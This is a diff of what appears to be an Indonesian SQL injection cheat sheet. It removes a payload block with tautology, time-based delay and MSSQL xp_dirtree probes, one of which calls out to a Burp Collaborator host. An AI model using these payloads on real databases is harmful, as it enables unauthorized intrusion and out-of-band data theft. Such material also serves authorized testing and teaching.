@@ -10,13 +10,7 @@
 ![image](https://user-images.githubusercontent.com/52058660/146121986-00960851-1a8e-4f32-8543-c980b75c6c24.png)
 
 ## Payload
-```
-'
-' OR 1=1--
-ASCII(97)
-'; waitfor delay ('0:00:20')--
-exec master..xp_dirtree'//asdfdagffdshsdfgadfgadfgaf.burpcollaborator.net/a'
-```
+
 
 ## UNION Attack
 Syarat:
